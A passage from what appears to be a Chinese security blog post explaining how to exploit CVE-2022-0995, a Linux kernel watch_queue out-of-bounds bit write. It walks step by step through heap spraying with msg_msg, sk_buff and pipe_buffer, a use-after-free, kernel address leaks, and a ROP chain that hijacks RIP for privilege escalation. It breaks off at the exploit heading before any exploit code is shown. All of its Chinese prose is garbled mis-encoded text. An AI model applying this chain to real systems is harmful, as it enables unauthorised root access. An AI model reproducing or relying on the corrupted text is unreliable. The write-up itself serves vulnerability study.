æ“ä½œ</strong>ï¼Œè¿™é‡Œçš„ <code>BIT_WORD()</code> å®ä¸»è¦æ˜¯é™¤ä»¥ long ç±»å‹æ‰€å ä½æ•°ï¼ˆ64ï¼‰ï¼Œè€Œ <code>BIT_MASK()</code> å®åˆ™æ˜¯å¯¹ long ç±»å‹æ‰€å ä½æ•°æ±‚æ¨¡åç»“æœä½œä¸º unsigned long å€¼ 1 å·¦ç§»çš„ä½æ•°å¯¼å‡ºç»“æœæ•°å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIT_MASK(nr)(UL(1) &lt;&lt; ((nr) % BITS_PER_LONG))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIT_WORD(nr)((nr) / BITS_PER_LONG)</span><br></code></pre></td></tr></table></figure><p>è€Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°åˆšå¥½ä¸º typeï¼Œç”±äºæˆ‘ä»¬çš„ type å¯ä»¥åœ¨ <code>[0x80, 0x400)</code> èŒƒå›´å†…å–ï¼Œ<strong>è€Œåˆ†é…çš„ filter ç©ºé—´å´æœªå¿…æœ‰é‚£ä¹ˆå¤§ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨ä¸€ä¸ªè¶Šç•Œç½® 1 ä½çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®ä¸€ä¸ªè¾ƒå¤§çš„ type å®Œæˆå †ä¸Šè¶Šç•Œç½® 1 ä½çš„æ“ä½œ</strong></p><p>ä¾‹å¦‚å¯¹äº <code>kmalloc-96</code> è€Œè¨€ï¼Œæˆ‘ä»¬çš„å¯¹è±¡å¯ä»¥è¦†ç›–åˆ°ä¸‹å›¾æ‰€ç¤ºèŒƒå›´ï¼ˆæœ¬å›¾æ¥è‡ªäº <a href="https://blog.csdn.net/Breeze_CAT/article/details/123845526">breezeO_oå¸ˆå‚…çš„åšå®¢</a>ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png" alt=""></p><h1>0x02.æ¼æ´åˆ©ç”¨</h1><p>åœ¨<a href="https://github.com/Bonfee/CVE-2022-0995">ç›®å‰å…¬å¼€çš„ exp</a> ä¸­å¯¹è¯¥æ¼æ´çš„åˆ©ç”¨å…¶å®æ˜¯åŸºäº <code>__set_bit()</code> è¿›è¡Œåˆ©ç”¨çš„ï¼Œå› ä¸ºç›¸è¾ƒäºä¸å¥½æ§åˆ¶çš„ filter æº¢å‡ºï¼Œè¶Šç•Œå†™ 1 ä½åˆ™æ›´æ–¹ä¾¿æˆ‘ä»¬æ§åˆ¶ä¸€äº›æŒ‡é’ˆï¼Œä¾‹å¦‚ <code>msg_msg-&gt;m_list</code> åŒå‘é“¾è¡¨</p><p>åœ¨è¿™ä»½å…¬å¼€çš„ exp ä¸­ä½¿ç”¨çš„å…¶å®æ˜¯ä¸ CVE-2021-22555 ç›¸åŒçš„åˆ©ç”¨æŠ€å·§ï¼Œåªä¸è¿‡ç¯¡æ”¹ <code>msg_msg</code> å¤´éƒ¨çš„æ–¹å¼ä¸æ˜¯é‚»æ¥æº¢å‡ºå†™ 0ï¼Œè€Œæ˜¯è¶Šç•Œå†™ 1ï¼›æ¥ä¸‹æ¥ç¬”è€…å°†<s>å¤§å¹…æ‹·è´</s>ä½¿ç”¨ä¸ CVE-2021-22555 ç›¸åŒçš„åˆ©ç”¨æŠ€å·§å®Œæˆå¯¹è¯¥æ¼æ´çš„åˆ©ç”¨</p><h2 id="ææƒ">ææƒ</h2><h3 id="Step-I-å †å–·-msg-msg-ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯">Step.I å †å–· <code>msg_msg</code> ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯</h3><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªå †ä¸Šè¶Šç•Œå†™ 1 ä½ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿæ¯”è¾ƒæœ´ç´ çš„ä¸€ç§æ€æƒ³ä¾¿æ˜¯è¦†å†™ä¸€ä¸ªç»“æ„ä½“ä¸­çš„æŒ‡é’ˆï¼Œåˆ©ç”¨ partial overwrite ä½¿å¾—ä¸¤ä¸ªè¿™æ ·çš„ç»“æ„ä½“çš„å¤´éƒ¨æŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªç»“æ„ä½“ï¼Œ<strong>ä»è€Œå®ç° object overlapping</strong></p><p>é‚£ä¹ˆé€‰ç”¨ä»€ä¹ˆæ ·çš„ç»“æ„ä½“ä½œä¸º victim å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ <code>msg_msg</code> è¿™ä¸€ç»“æ„ä½“ï¼Œå…¶é•¿åº¦å¯æ§ï¼Œä¸”å¼€å¤´æ­£å¥½æ˜¯å†…æ ¸åŒå‘é“¾è¡¨ç»“æ„ä½“ï¼Œæˆ‘ä»¬æ‰€èƒ½è¦†å†™çš„ä¸ºå…¶ next æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€å¤šä¸ªæ¶ˆæ¯æ—¶ï¼Œä¼šå½¢æˆå¦‚ä¸‹ç»“æ„ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€å¼€å§‹æ—¶å…ˆåˆ›å»ºå¤šä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶åˆ†åˆ«åœ¨æ¯ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸¤æ¡æ¶ˆæ¯ï¼Œå½¢æˆå¦‚ä¸‹å†…å­˜å¸ƒå±€ï¼Œè¿™é‡Œä¸ºäº†ä¾¿åˆ©åç»­åˆ©ç”¨ï¼Œç¬¬ä¸€æ¡æ¶ˆæ¯ï¼ˆä¸»æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 96ï¼Œç¬¬äºŒæ¡æ¶ˆæ¯ï¼ˆè¾…åŠ©æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 0x400ï¼š</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>ä¹‹åæˆ‘ä»¬è¯»å‡ºå…¶ä¸­å‡ ä¸ªæ¶ˆæ¯é˜Ÿåˆ—çš„ä¸»æ¶ˆæ¯ä»¥äº§ç”Ÿç©ºæ´ï¼Œå†åˆ©ç”¨ <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> è·å–åˆ°æˆ‘ä»¬åˆšé‡Šæ”¾çš„ <code>msg_msg</code> ç»“æ„ä½“çš„ç©ºé—´</p><p><img src="https://s2.loli.net/2022/04/06/pql2L98kxRvaZzA.png" alt="image.png"></p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>æˆ‘ä»¬è‡³å°‘è¦é‡Šæ”¾ä¸¤ä¸ªä¸»æ¶ˆæ¯ï¼Œå› ä¸ºåœ¨åˆ†é…åˆ° watch_filter ä¹‹å‰ memdup_user() è¿˜éœ€è¦è·å–ä¸€ä¸ªå¯¹è±¡</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="hljs-keyword">sizeof</span>(*tf));<br><span class="hljs-keyword">if</span> (IS_ERR(tf))<br><span class="hljs-keyword">return</span> PTR_ERR(tf);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* Now we need to build the internal filter from only the relevant</span><br><span class="hljs-comment"> * user-specified filters.</span><br><span class="hljs-comment"> */</span><br>ret = -ENOMEM;<br>wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);<br></code></pre></td></tr></table></figure><p>å¯¹äº <code>__set_bit()</code> è€Œè¨€å…¶å¯ä»¥ç½® 1 çš„èŒƒå›´å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåˆšå¥½å¯ä»¥è¦†ç›–åˆ°ä¸‹ä¸€ç›¸é‚» object çš„å‰ 16 å­—èŠ‚</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png" alt="image.png"></p><p>åˆ©ç”¨è¶Šç•Œç½® 1 ä½æˆ‘ä»¬å¯ä»¥è¦†å†™åˆ°å…¶ç›¸é‚»çš„ä¸»æ¶ˆæ¯çš„ next æŒ‡é’ˆï¼Œè‹¥è¯¥ä½åˆšå¥½è¢«ç”± 0 å˜ä¸º 1ï¼Œåˆ™æˆ‘ä»¬å¾ˆå®¹æ˜“æ„é€ å‡º<strong>åœ¨ä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå­˜åœ¨ä¸¤ä¸ªä¸»æ¶ˆæ¯æŒ‡å‘åŒä¸€ä¸ªè¾…åŠ©æ¶ˆæ¯</strong>çš„è¿™æ ·çš„å±€é¢</p><p><img src="https://s2.loli.net/2022/04/06/NWHMurcU36EsIAp.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ä¸»ä»æ¶ˆæ¯ä¸­æ”¾ç½®å¯¹åº”çš„å€¼æ¥æ ‡è¯†å–·å°„çš„ä¸åŒçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œéå†è¯»å–æ‰€æœ‰é˜Ÿåˆ—æ¥æ„ŸçŸ¥æŒ‡å‘äº†åŒä¸€è¾…åŠ©æ¶ˆæ¯çš„ä¸¤ä¸ªé˜Ÿåˆ—</p><blockquote><p>åˆ©ç”¨ <code>MSG_COPY</code> æ ‡å¿—ä½å¯ä»¥è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸Šçš„æ¶ˆæ¯è€Œä¸é‡Šæ”¾ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-II-é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€ -UAF">Step.II é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€  UAF</h3><p>æ­¤æ—¶æˆ‘ä»¬å°†è¾…åŠ©æ¶ˆæ¯é‡Šæ”¾æ‰ï¼Œä¾¿èƒ½æˆåŠŸå®Œæˆ UAF çš„æ„å»ºï¼Œæ­¤æ—¶<strong>æˆ‘ä»¬ä»èƒ½é€šè¿‡å…¶ä¸­ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—è®¿é—®åˆ°è¯¥è¾…åŠ©æ¶ˆæ¯å¯¹åº” objectï¼Œä½†å®é™…ä¸Šè¿™ä¸ª object å·²ç»åœ¨ freelist ä¸Šäº†</strong></p><p><img src="https://s2.loli.net/2022/04/06/w9RE63dNuVjcmbp.png" alt="image.png"></p><h3 id="Step-III-å †å–·-sk-buff-ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ²-UAF-obj-åœ°å€">Step.III å †å–· <code>sk_buff</code> ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ² UAF obj åœ°å€</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•åˆ©ç”¨è¿™ä¸ª UAFï¼Œå› ä¸ºå…¶ä»ä½äºæ¶ˆæ¯é˜Ÿåˆ—ä¸Šæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ä¼ªé€  <code>msg_msg</code> ç»“æ„ä½“è¿›è¡Œåç»­çš„åˆ©ç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰ç”¨å¦å¤–ä¸€ä¸ªå¸¸ç”¨æ¥è¿›è¡Œå †å–·çš„ç»“æ„ä½“â€”â€”<code>sk_buff</code>ï¼Œç±»ä¼¼äº <code>msg_msg</code>ï¼Œå…¶åŒæ ·å¯ä»¥æä¾›è¿‘ä¹ä»»æ„å¤§å°å¯¹è±¡çš„åˆ†é…å†™å…¥ä¸é‡Šæ”¾ï¼Œä½†ä¸åŒçš„æ˜¯ <code>msg_msg</code> ç”±ä¸€ä¸ª header åŠ ä¸Šç”¨æˆ·æ•°æ®ç»„æˆï¼Œè€Œ <code>sk_buff</code> æœ¬èº«ä¸åŒ…å«ä»»ä½•ç”¨æˆ·æ•°æ®ï¼Œ<strong>ç”¨æˆ·æ•°æ®å•ç‹¬å­˜æ”¾åœ¨ä¸€ä¸ª object å½“ä¸­ï¼Œè€Œ sk_buff ä¸­å­˜æ”¾æŒ‡å‘ç”¨æˆ·æ•°æ®çš„æŒ‡é’ˆ</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>è‡³äºè¿™ä¸ªç»“æ„ä½“çš„åˆ†é…ä¸é‡Šæ”¾ä¹Ÿæ˜¯ååˆ†ç®€å•ï¼Œ<strong>sk_buff åœ¨å†…æ ¸ç½‘ç»œåè®®æ ˆä¸­ä»£è¡¨ä¸€ä¸ªã€ŒåŒ…ã€ï¼Œ<strong>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯</strong>æˆ‘ä»¬åªéœ€è¦åˆ›å»ºä¸€å¯¹ socketï¼Œåœ¨ä¸Šé¢å‘é€ä¸æ¥æ”¶æ•°æ®åŒ…å°±èƒ½å®Œæˆ sk_buff çš„åˆ†é…ä¸é‡Šæ”¾</strong>ï¼Œæœ€ç®€å•çš„åŠæ³•ä¾¿æ˜¯ç”¨ socketpair ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€å¯¹ socketï¼Œä¹‹åå¯¹å…¶ read &amp; write ä¾¿èƒ½å®Œæˆæ”¶å‘åŒ…çš„å·¥ä½œ</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•é€šè¿‡ä¼ªé€  <code>msg_msg</code> ç»“æ„ä½“å®Œæˆä¿¡æ¯æ³„éœ²ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯å¯ä»¥ä¼ªé€ ä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“ï¼Œå°†å…¶ <code>m_ts</code> åŸŸè®¾ä¸ºä¸€ä¸ªè¾ƒå¤§å€¼ï¼Œ<strong>ä»è€Œè¶Šç•Œè¯»å–åˆ°ç›¸é‚»è¾…åŠ©æ¶ˆæ¯çš„ headerï¼Œæ³„éœ²å‡ºå †ä¸Šåœ°å€</strong></p><p><img src="https://s2.loli.net/2022/04/06/QEysxG1YmcUTBAj.png" alt="image.png"></p><p>æˆ‘ä»¬æ³„éœ²å‡ºæ¥çš„æ˜¯å“ªä¸ªåœ°å€ï¼Ÿè®©æˆ‘ä»¬é‡æ–°å°†ç›®å…‰æ”¾å›åˆ°æ¶ˆæ¯é˜Ÿåˆ—çš„ç»“æ„ä¸Šï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾çŸ¥é“çš„æ˜¯ï¼Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ prev æŒ‡é’ˆæŒ‡å‘å…¶ä¸»æ¶ˆæ¯ï¼Œè€Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ next æŒ‡é’ˆæŒ‡å‘è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„ <code>msg_queue</code> ç»“æ„ï¼Œè¿™æ˜¯ç›®å‰æˆ‘ä»¬å·²çŸ¥çš„ä¸¤ä¸ªâ€œå †ä¸Šåœ°å€â€</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¼ªé€  <code>msg_msg-&gt;next</code>ï¼Œ<strong>å°†å…¶æŒ‡å‘æˆ‘ä»¬çš„ UAF object ç›¸é‚»çš„è¾…åŠ©æ¶ˆæ¯å¯¹åº”çš„ä¸»æ¶ˆæ¯å¤´éƒ¨å¾€å‰ï¼Œä»è€Œè¯»å‡ºè¯¥ä¸»æ¶ˆæ¯çš„å¤´éƒ¨ï¼Œæ³„éœ²å‡ºå¯¹åº”çš„è¾…åŠ©æ¶ˆæ¯çš„åœ°å€</strong>ï¼Œæœ‰äº†è¿™ä¸ªè¾…åŠ©æ¶ˆæ¯çš„åœ°å€ï¼Œå†å‡å» 0x400 <strong>ä¾¿æ˜¯æˆ‘ä»¬çš„ UAF å¯¹è±¡çš„åœ°å€</strong></p><blockquote><p>é€šè¿‡ä¼ªé€  msg_msg-&gt;next å¯ä»¥å®Œæˆä»»æ„åœ°å€è¯»ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-IV-å †å–·-pipe-bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€">Step.IV å †å–· <code>pipe_buffer</code>ï¼Œæ³„éœ²å†…æ ¸åŸºå€</h3><p>ç°åœ¨æˆ‘ä»¬å·²çŸ¥äº†å¯æ§åŒºåŸŸçš„åœ°å€ï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬æ¥è€ƒè™‘æ³„éœ²å†…æ ¸ .text æ®µçš„åŸºå€ï¼Œä»¥åŠå¦‚ä½•åŠ«æŒ RIP å®Œæˆææƒ</p><p>ä¹‹å‰æˆ‘ä»¬ä¸ºä»€ä¹ˆå°†è¾…åŠ©æ¶ˆæ¯çš„å¤§å°è®¾ä¸º 0x400ï¼Ÿé™¤äº†æ–¹ä¾¿å¯¹é½ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€å±‚è€ƒè™‘å°±æ˜¯è¿™ä¸ªå¤§å°åˆšå¥½æœ‰ä¸€ä¸ªååˆ†å®ç”¨çš„ç»“æ„ä½“ <code>pipe_buffer</code> æ•°ç»„ï¼Œ<strong>æ—¢èƒ½å¸®æˆ‘ä»¬æ³„éœ²å†…æ ¸ä»£ç æ®µåŸºå€ï¼Œä¹Ÿèƒ½å¸®æˆ‘ä»¬åŠ«æŒ RIP</strong></p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç”Ÿæˆæ•°ä¸ªè¿ç»­çš„ <code>pipe_buffer</code> ç»“æ„ä½“ï¼Œç”³è¯·çš„å†…å­˜æ€»å¤§å°åˆšå¥½ä¼šè®©å†…æ ¸ä» kmalloc-1k ä¸­å–å‡ºä¸€ä¸ª object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>pipe_buffer</code> ä¸­å­˜åœ¨ä¸€ä¸ªå‡½æ•°è¡¨æˆå‘˜ <code>pipe_buf_operations</code> ï¼Œå…¶æŒ‡å‘å†…æ ¸ä¸­çš„å‡½æ•°è¡¨ <code>anon_pipe_buf_ops</code>ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿå°†å…¶è¯»å‡ºï¼Œä¾¿èƒ½æ³„éœ²å‡ºå†…æ ¸åŸºå€ï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨ <code>sk_buff</code> ä¿®å¤è¾…åŠ©æ¶ˆæ¯ï¼Œä¹‹åä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ­¤æ—¶è¯¥ object é‡å› slub ä¸­ï¼Œä½† <code>sk_buff</code> ä»æŒ‡å‘è¯¥ object</li><li>å–·å°„ <code>pipe_buffer</code>ï¼Œä¹‹åå†æ¥æ”¶ <code>sk_buff</code> æ•°æ®åŒ…ï¼Œ<strong>æˆ‘ä»¬ä¾¿èƒ½è¯»å‡º pipe_buffer ä¸Šæ•°æ®ï¼Œæ³„éœ²å†…æ ¸åŸºå€</strong></li></ul><h3 id="Step-V-ä¼ªé€ -pipe-bufferï¼Œæ„é€ -ROPï¼ŒåŠ«æŒ-RIPï¼Œå®Œæˆææƒ">Step.V ä¼ªé€  pipe_bufferï¼Œæ„é€  ROPï¼ŒåŠ«æŒ RIPï¼Œå®Œæˆææƒ</h3><p>å½“æˆ‘ä»¬å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œä¼šè§¦å‘ <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> è¿™ä¸€æŒ‡é’ˆï¼Œè€Œ UAF object çš„åœ°å€å¯¹æˆ‘ä»¬è€Œè¨€æ˜¯å·²çŸ¥çš„ï¼Œå› æ­¤<strong>æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ sk_buff åœ¨ UAF object ä¸Šä¼ªé€ å‡½æ•°è¡¨ä¸æ„é€  ROP chainï¼Œå†é€‰ä¸€æ¡è¶³å¤Ÿåˆé€‚çš„ gadget å®Œæˆæ ˆè¿ç§»ä¾¿èƒ½åŠ«æŒ RIP å®Œæˆææƒ</strong></p><p><img src="https://s2.loli.net/2022/04/06/P8AlaFMCqeSObn2.png" alt="image.png"></p><h3 id="Final-EXPLOIT">Final EXPLOIT</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼ˆåŸºæœ¬ä¸Šå°±æ˜¯æŠŠ CVE-2021-22555 çš„ exp é‡Œ trigger oob çš„å‡½æ•°æ”¹ä¸€ä¸‹å°±èƒ½æ‰“é€šäº†ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span 